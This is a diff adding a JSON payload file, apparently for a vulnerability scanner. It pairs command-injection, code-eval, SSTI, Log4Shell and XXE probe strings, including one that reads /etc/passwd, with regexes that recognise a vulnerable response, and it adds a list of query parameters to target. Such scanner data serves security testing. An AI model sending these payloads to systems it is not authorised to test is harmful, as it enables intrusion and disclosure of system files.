@@ -1,0 +1,98 @@
+{
+  "rce_payloads": [
+    {
+      "name": "Basic Unix command injection (semicolon)",
+      "payload": ";id",
+      "pattern": "uid=\\d+.*gid=\\d+",
+      "severity": "CRITICAL"
+    },
+    {
+      "name": "Unix command injection (pipe)",
+      "payload": "|id",
+      "pattern": "uid=\\d+.*gid=\\d+",
+      "severity": "CRITICAL"
+    },
+    {
+      "name": "Unix command injection (backtick)",
+      "payload": "`id`",
+      "pattern": "uid=\\d+.*gid=\\d+",
+      "severity": "CRITICAL"
+    },
+    {
+      "name": "Unix command injection (dollar-paren)",
+      "payload": "$(id)",
+      "pattern": "uid=\\d+.*gid=\\d+",
+      "severity": "CRITICAL"
+    },
+    {
+      "name": "Windows command injection (ampersand)",
+      "payload": "&whoami",
+      "pattern": "(administrator|nt authority|system|root)",
+      "severity": "CRITICAL"
+    },
+    {
+      "name": "Python eval probe",
+      "payload": "__import__('os').system('id')",
+      "pattern": "uid=\\d+.*gid=\\d+",
+      "severity": "CRITICAL"
+    },
+    {
+      "name": "PHP exec probe",
+      "payload": "<?php system('id'); ?>",
+      "pattern": "uid=\\d+.*gid=\\d+",
+      "severity": "CRITICAL"
+    },
+    {
+      "name": "SSTI Jinja2/Twig basic probe",
+      "payload": "{{7*7}}",
+      "pattern": "\\b49\\b",
+      "severity": "HIGH"
+    },
+    {
+      "name": "SSTI Jinja2 config object leak",
+      "payload": "{{config}}",
+      "pattern": "<Config",
+      "severity": "HIGH"
+    },
+    {
+      "name": "SSTI Freemarker probe",
+      "payload": "${7*7}",
+      "pattern": "\\b49\\b",
+      "severity": "HIGH"
+    },
+    {
+      "name": "Log4Shell JNDI probe (header-based)",
+      "payload": "${jndi:ldap://127.0.0.1/a}",
+      "pattern": "uid=|root|administrator",
+      "severity": "CRITICAL"
+    },
+    {
+      "name": "XInclude / XXE probe",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "pattern": "root:x:|nobody:",
+      "severity": "CRITICAL"
+    }
+  ],
+  "common_query_params": [
+    "q",
+    "search",
+    "query",
+    "cmd",
+    "exec",
+    "command",
+    "input",
+    "data",
+    "value",
+    "text",
+    "name",
+    "id",
+    "file",
+    "path",
+    "url",
+    "page",
+    "template",
+    "redirect",
+    "token",
+    "action"
+  ]
+}
